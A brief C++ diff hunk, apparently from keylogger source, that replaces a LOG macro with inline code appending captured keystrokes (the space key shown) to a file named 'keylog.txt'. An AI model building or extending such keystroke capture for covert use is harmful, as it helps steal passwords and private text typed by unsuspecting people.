@@ -18,7 +18,13 @@ int main()
 	{
 	case VK_SPACE:
 		cout << " ";
-		LOG(" ");
+		fstream logFile;
+  		logFile.open("keylog.txt", fstream::app);
+  		if(logFile.is_open())
+ 		{
+    			logFile << " ";
+    			logFile.close();
+  		}
 		return true;
 	case VK_RETURN:
 		cout << "\n";
